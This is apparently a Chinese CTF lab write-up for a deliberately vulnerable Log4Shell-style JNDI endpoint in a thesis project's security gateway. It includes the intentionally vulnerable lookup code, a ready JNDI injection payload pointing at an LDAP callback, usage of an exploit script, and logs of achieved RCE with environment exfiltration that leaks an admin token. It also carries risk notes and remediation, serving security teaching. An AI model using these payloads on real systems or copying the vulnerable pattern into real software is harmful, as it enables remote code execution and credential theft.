# CTF 题目 002 · Log4Shell（JNDI 远程类加载 → RCE）

## 一、题目信息

| 项 | 值 |
| --- | --- |
| 类型 | Web / JNDI 注入（CVE-2021-44228 等价实现） |
| 难度 | 高 |
| 入口 | `POST /api/log4shell`（Gateway 公网入口 `/api/log4shell`） |
| 权限要求 | **匿名**（`SecurityConfig` 中 `permitAll()`，无需令牌） |
| 目标 | 在 `security-gateway` 容器内执行命令 |
| 验证物 | `/tmp/RCE_PROOF_LOG4SHELL.txt`（内容 `PWNED-BY-LOG4SHELL`） |
| 利用脚本 | `log4shell_exp.py` |
| 插拔开关 | `LOG4SHELL_TRUST_CODEBASE`（见第五节） |

## 二、题目背景

`carapace`（安全网关，Java 21 / Spring Boot 4）暴露了一个日志接收端点
`Log4ShellController`，用于复现 log4j 2.14.1 `StrSubstitutor` 对
`${jndi:...}` 占位符的解析行为。

```java
private static final Pattern JNDI_LOOKUP = Pattern.compile("\\$\\{jndi:([^}]+)}");

@PostMapping
public ResponseEntity<Map<String, Object>> log(@RequestBody Map<String, String> body) {
    String message = body.getOrDefault("message", "");
    boolean vuln = vulnSwitches.isEnabled(VulnSwitchRegistry.LOG4SHELL);
    if (vuln) {
        String resolved = vulnerableJndiSubstitute("Received message: " + message);
        ...
    }
}

private static String vulnerableJndiSubstitute(String input) {
    Matcher m = JNDI_LOOKUP.matcher(input);
    ...
    Context ctx = new InitialContext();
    // INTENTIONALLY VULNERABLE: 直接对用户字段做 JNDI lookup
    Object obj = ctx.lookup(jndiUrl);
    ...
}
```

**漏洞要点**：用户可控字符串里的 `${jndi:...}` 被当作占位符展开，
`InitialContext.lookup()` 直接对攻击者指定的 URL 发起 JNDI 查询。

## 三、触发点定位（能否融入业务系统？）

> 这是本关的关键结论，需要明确回答。

| 问题 | 结论 |
| --- | --- |
| 触发点在哪？ | **Gateway 自身的 HTTP 端点** `POST /api/log4shell` |
| 是否被业务流量间接触发？ | **否**。全仓库检索 `log4shell` 的引用只有：端点定义、`SecurityConfig` 白名单、nginx 路由、前端开关面板。**没有任何业务代码把用户输入喂给它** |
| 公网可达？ | **是**。nginx `location ~ ^/(?:api/(?:waf\|honeypot\|admin\|preview\|log4shell)\|decoy)(?:/\|$)` → `security_gateway` |
| 匿名可打？ | **是**。`SecurityConfig.java:35` 把 `/api/log4shell` 列入 `permitAll()` |
| WAF 拦截？ | **否**。4 条规则覆盖 sqli / xss / path-traversal / cmd-injection，**不含 JNDI** |
| 结论 | 它是**独立暴露在公网的端点**，不是隐藏在某条业务链里的注入点。教学上"贴合真实 Log4Shell"的等价物是：**一个接收用户输入并写日志的入口** |

**教学口径建议**：把它讲成「一个在线的日志采集/上报入口」——真实世界里
Log4Shell 的触发点正是"用户输入被写进日志"，攻击者只需要让那条输入
落到有漏洞的 log4j 上。此处 `message` 字段扮演的就是"被记录的用户输入"。

## 四、完整利用链

```
攻击机                                  security-gateway (JDK 21)
  │                                              │
  │  ① POST /api/log4shell                       │
  │     {"message":"${jndi:ldap://A:1389/Exploit}"}
  │ ────────────────────────────────────────────▶│
  │                                              │ ② JNDI_LOOKUP 正则命中
  │                                              │    InitialContext.lookup()
  │  ③ LDAP BindRequest ─────────────────────────▶│
  │  ◀──── BindResponse ─────────────────────────│
  │  ④ LDAP SearchRequest ──────────────────────▶│
  │  ◀──── SearchResultEntry ────────────────────│
  │         javaClassName = Exploit              │
  │         javaCodeBase  = http://A:8888/       │
  │         javaFactory   = Exploit              │
  │                                              │ ⑤ JNDI 去 codebase 取类
  │  ⑥ HTTP GET /Exploit.class ─────────────────▶│
  │  ◀──── 200 Exploit.class ────────────────────│
  │                                              │ ⑦ 类加载 → static{} 执行
  │                                              │    ============== RCE ==============
```

### 4.1 为什么需要 `LOG4SHELL_TRUST_CODEBASE=true`

JDK 21 自 8u191 / 11.0.1 起，`com.sun.jndi.ldap.object.trustURLCodebase`
**默认 false**，JNDI 会拒绝从远程 codebase 加载类。

| 开关 | 行为 | 结果 |
| --- | --- | --- |
| `false` / 空 / 未定义 | JVM 不注入任何参数，保持 JDK 21 默认 | LDAP 回连成功，**类不下载**，仅验证注入点 |
| `true` | JVM 注入 `-Dcom.sun.jndi.ldap.object.trustURLCodebase=true` | **完整 RCE** |

脚本对两种情况都会明确判定，不会把"只回连"误报成 RCE。

## 五、插拔开关

### 5.1 用法

```bash
cd /root/Yulin2026/thesis
scripts/log4shell_switch.sh status        # 查看状态（含容器内实际 JVM 参数）
scripts/log4shell_switch.sh on  --recreate  # 开启 → 真实 RCE
scripts/log4shell_switch.sh off --recreate  # 关闭 → 安全态
```

`status` 会把 `.env` 的配置值与容器内**实际生效**的 `JAVA_TOOL_OPTIONS`
一起打印，两者不一致时会显现出来（容器未重建的情况）。

### 5.2 实现

`compose.yaml`（`security-gateway.environment`）：

```yaml
      # 只认字面 true：.env 里的 LOG4SHELL_TRUST_CODEBASE 经
      # LOG4SHELL_TRUST_CODEBASE_ARMED 归一化（见 scripts/log4shell_switch.sh）。
      JAVA_TOOL_OPTIONS: >-
        ${LOG4SHELL_TRUST_CODEBASE_ARMED:+-Dcom.sun.jndi.ldap.object.trustURLCodebase=true}
      LOG4SHELL_TRUST_CODEBASE_ARMED: ${LOG4SHELL_TRUST_CODEBASE_ARMED:-}
```

> ⚠️ **踩坑记录**：最初写成
> `${LOG4SHELL_TRUST_CODEBASE:+-D...=${LOG4SHELL_TRUST_CODEBASE}}`，
> 这里有 **两个** 缺陷：
> 1. `${VAR:+...}` 只要 `VAR` **非空**就展开 —— `false` 也是"非空"，
>    所以运维写 `false` 期待安全态，**实际会开启 RCE**；
> 2. 直接把 `${LOG4SHELL_TRUST_CODEBASE}` 拼进参数值，语义上把
>    "是否开启"和"值是什么"耦合在一起。
>
> 现改为由 `LOG4SHELL_TRUST_CODEBASE_ARMED` 驱动，该变量只在
> 字面值为 `true`（大小写不敏感）时才非空。已验证：

| `.env` 值 | ARMED | `JAVA_TOOL_OPTIONS` |
| --- | --- | --- |
| `true` | yes | `-Dcom.sun.jndi.ldap.object.trustURLCodebase=true` |
| `TRUE` / `True` | yes | `-Dcom.sun.jndi.ldap.object.trustURLCodebase=true` |
| `false` | (空) | *(不注入)* |
| 空 | (空) | `""` |

### 5.3 重建要求

`JAVA_TOOL_OPTIONS` 是 **JVM 启动参数**，改完必须重建容器：

```bash
docker compose --env-file .env up -d --no-deps --force-recreate security-gateway
```

`scripts/log4shell_switch.sh` 的 `--recreate` 已包含该步骤 + 健康检查等待。

## 六、复现步骤

```bash
# 前置：开关开启
/root/Yulin2026/thesis/scripts/log4shell_switch.sh on --recreate

# 运行利用脚本（--callback 填 gateway 能路由到的攻击机地址）
cd /root/Yulin2026/thesis/ctf
python3 log4shell_exp.py \
  --host <LAB-IP> --port 8008 \
  --callback 172.20.0.1 \
  --insecure

# 验证 RCE 落地
docker exec thesis-drive-security-gateway-1 cat /tmp/RCE_PROOF_LOG4SHELL.txt
```

脚本会自动完成：编译 payload → 起 LDAP/HTTP 服务 → 投递 payload →
等待回连 → 打印**完整的原始字节交互**（BER 十六进制 + ASCII）→ 结果判定。

### 6.1 `--callback` 怎么填

`--callback` 必须是 **security-gateway 容器能路由到的攻击机地址**。

| 攻击机位置 | 推荐值 |
| --- | --- |
| 靶机宿主机上（本项目默认） | `172.20.0.1`（`thesis-drive_backend` 网桥的宿主侧地址） |
| 另一台同网段机器 | 该机器在 `172.20.0.0/16` 的地址 |

> 若网关无法回连 `--callback`，脚本会在步骤 5 报
> `LDAP 未收到任何连接`，此时检查地址与防火墙。

### 6.2 外部攻击机模式（`--external`）

当攻击机**不是靶机宿主机**（例如从一台 Windows 笔记本发起），且该机器
**无法被靶机反向路由**时，`--callback` 不能填攻击机自己的地址。此时用
`--external`：**触发请求仍由攻击机真实发出**，LDAP/HTTP 回调服务则通过
SSH 自动部署到靶机宿主机上跑，`--callback` 填**靶机能路由到的地址**
（通常是 `172.20.0.1`）。

```powershell
# 在 Windows 攻击机上
cd D:\Thesis\ThesisDrive\ctf
$env:PYTHONIOENCODING="utf-8"
python log4shell_exp.py --external `
  --ssh opencloud `
  --host <LAB-IP> --port 8008 `
  --callback 172.20.0.1 `
  --insecure
```

脚本在外部模式下会：

1. 本机编译 payload；**若无 JDK 则自动回退到靶机编译**（只需 SSH 可达）；
2. 把自身 + `Exploit.class` 推到靶机 `/tmp/log4shell_helper`；
3. 以 `setsid nohup` 后台拉起 `--serve-only` 回调服务，轮询
   `helper.log` 的 `LISTENING` 行确认就绪，并回显 `ss -tlnp` 端口；
4. **由本机** `POST https://<host>:<port>/api/log4shell` —— 这一步是
   真正从攻击机发出的外部攻击流量；
5. 回靶机侧收集 `helper.log` 交互记录，并在网关容器内读
   `/tmp/RCE_PROOF_LOG4SHELL.txt` 作为 RCE 证据；
6. 自动清理靶机上的 helper（加 `--keep-helper` 可保留）。

代价与边界（如实记录）：回调载荷（`javaCodeBase`）指向的是
**靶机宿主机的 `172.20.0.1:8888`**，不是攻击机 —— 因为靶机无法反向
路由到攻击机。也就是说**注入请求确由攻击机发起，但恶意类的投递
由靶机宿主机代跑**。若要连投递也完全由攻击机完成，需要靶机侧放开
`GatewayPorts` 或建立反向隧道，这属于改动靶机 `sshd` 的加固动作，
本教学环境不采用。

### 6.3 外部模式实测（2026-09-21，从 Windows 发起）

```
步骤 1 · 编译恶意 payload 类
  [!] 本机编译不可用: 找不到 javac（需要 JDK，不是 JRE）
  [*] 改为在靶机上编译（外部模式自动回退）
  [+] 靶机编译完成   -rw-r--r-- 1 root root 1612 Exploit.class
步骤 2a · 在靶机部署回调服务
  [+] 回调服务已在靶机启动
  [远端] LISTEN 0 5 0.0.0.0:1389
  [远端] LISTEN 0 5 0.0.0.0:8888
步骤 4 · 向业务端点投递 payload（由本机真实发出）
  POST https://<LAB-IP>:8008/api/log4shell
  body: {"message": "${jndi:ldap://172.20.0.1:1389/Exploit}"}
  [+] HTTP 200  (0.48s)
  resolved: "Received message: Reference Class Name: Exploit
"
步骤 5a · 从靶机侧收集回调证据
  [远端] [20:40:01] LDAP BindRequest (msgid=1)
  [远端] [20:40:01] LDAP SearchRequest (msgid=2)
  [远端]   [★] 命中！网关正在查询 JNDI 引用 → 返回恶意 Reference
  [远端] [20:40:01] 网关下载 payload: GET /Exploit.class → 200 (1612 bytes)
步骤 5b · 验证 RCE 落地（网关容器内）
  [+] 找到 RCE 证据 /tmp/RCE_PROOF_LOG4SHELL.txt
  [网关] PWNED-BY-LOG4SHELL
  [网关] user=carapace
  [网关] cwd=/app
  [网关] trustURLCodebase=true
步骤 6 · 结果判定
  ✔ 完整利用链打通      RCE 达成
```

**结论：外部攻击机（Windows）真实发出的一次 HTTP 请求，导致了
`security-gateway` 容器内的任意命令执行。**

## 七、实测记录（2026-09-21）

### 7.1 开关 ON — 完整 RCE

```
[!] 命中！网关正在查询 JNDI 引用 → 准备返回恶意 Reference
[20:13:30] ★ 网关下载 payload: GET /Exploit.class → 200 (1612 bytes)
[+] LDAP 交互记录 5 条
[+] HTTP 交互记录 2 条 —— 网关已下载 payload！
步骤 6 · 结果判定
✔ 完整利用链打通      RCE 达成
```

容器内验证物：

```
$ docker exec thesis-drive-security-gateway-1 cat /tmp/RCE_PROOF_LOG4SHELL.txt
PWNED-BY-LOG4SHELL
time=Mon Sep 21 12:13:30 UTC 2026
host=4f53e106c524
user=carapace
cwd=/app
trustURLCodebase=true
```

**连带危害** —— payload 的 static 块顺带 `env` 外带，直接泄露管理令牌：

```
uid=10001(carapace) gid=10001(carapace) groups=10001(carapace)
CARAPACE_ADMIN_TOKEN=<ADMIN-TOKEN>
CFMS_INTERNAL_URL=wss://drive-core:5104
```

### 7.2 关键原始字节

**网关发出的 LDAP BindRequest**（14 字节，anonymous bind）：

```
30 0c 02 01 01 60 07 02 01 03 04 00 80 00
└─SEQUENCE ─┘└msgID=1┘└BindReq ┘└ver=3┘└""─┘└─┘
```

**本地回包的 SearchResultEntry**（159 字节，携带 Reference 三元组）：

```
30 81 9c 02 01 02 64 81 96 04 0a 63 6e 3d 45 78  0.....d....cn=Ex
70 6c 6f 69 74 30 81 87 30 24 04 0b 6f 62 6a 65  ploit0..0$..obje
63 74 43 6c 61 73 73 31 15 04 13 6a 61 76 61 4e  ctClass1...javaN
61 6d 69 6e 67 52 65 66 65 72 65 6e 63 65 30 1a  amingReference0.
04 0d 6a 61 76 61 43 6c 61 73 73 4e 61 6d 65 31  ..javaClassName1
09 04 07 45 78 70 6c 6f 69 74 30 29 04 0c 6a 61  ...Exploit0)..ja
76 61 43 6f 64 65 42 61 73 65 31 19 04 17 68 74  vaCodeBase1...ht
74 70 3a 2f 2f 31 37 32 2e 32 30 2e 30 2e 31 3a  tp://172.20.0.1:
38 38 38 38 2f 30 18 04 0b 6a 61 76 61 46 61 63  8888/0...javaFac
74 6f 72 79 31 09 04 07 45 78 70 6c 6f 69 74     tory1...Exploit
```

**网关响应**（132 字节，`resolved` 里回显 Reference 类名 = JNDI 确实拿到并解析了对象）：

```json
{"vulnerable":true,
 "logged":"${jndi:ldap://172.20.0.1:1389/Exploit}",
 "resolved":"Received message: Reference Class Name: Exploit\n"}
```

### 7.3 开关 OFF — 对照实验

```
[-] LDAP 已回连，但网关未下载 Exploit.class
[!] 这是 JDK 21 trustURLCodebase=false 的典型表现
[*] → 需设置 LOG4SHELL_TRUST_CODEBASE=true 并重建 security-gateway
[*]   此时链路仅验证到「注入点可触发远程 JNDI」，不能 RCE
```

容器内 `JAVA_TOOL_OPTIONS = <未设置>`，无 `RCE_PROOF` 文件。

**对照结论**：注入点本身始终真实存在（开关只控 `VULN_LOG4SHELL_ENABLED`）；
`LOG4SHELL_TRUST_CODEBASE` 控制的是"JVM 是否信任远程 codebase"，
即 **能否把注入升级为 RCE**。这正好构成一组干净的教学对照。

## 八、涉及代码

| 文件 | 作用 |
| --- | --- |
| `carapace/.../vuln/Log4ShellController.java` | 注入点：正则提取 `${jndi:...}` + `InitialContext.lookup()` |
| `carapace/.../vuln/VulnSwitchRegistry.java` | `LOG4SHELL="log4shell"` 开关注册 |
| `carapace/.../config/SecurityConfig.java` | `permitAll()` 白名单（匿名可达） |
| `infra/nginx/nginx.conf` | `/api/log4shell` 反代到 security_gateway |
| `compose.yaml` | `JAVA_TOOL_OPTIONS` 插拔注入 |
| `scripts/log4shell_switch.sh` | 插拔开关 CLI（含状态自检） |
| `ctf/log4shell_exp.py` | 本文利用脚本 |

## 九、风险提示

1. **`LOG4SHELL_TRUST_CODEBASE=true` 显著提高风险**：任何能访问
   `POST /api/log4shell` 的人都能在 `security-gateway` 容器内执行任意命令，
   并顺带读到 `CARAPACE_ADMIN_TOKEN`（→ 管理面完全接管）。
2. 该端点在 `SecurityConfig` 中为 `permitAll()`，**且 nginx 从公网暴露**。
   按 `LAN_DEPLOYMENT.md` 应只绑 RFC1918 + 防火墙白名单。
3. **交付前建议置回 `off`**（`scripts/log4shell_switch.sh off --recreate`）。
4. 若要彻底消除该面：把 `/api/log4shell` 从 `permitAll()` 移出，
   并对 `message` 做 `${...}` 转义（或直接下线该端点）。
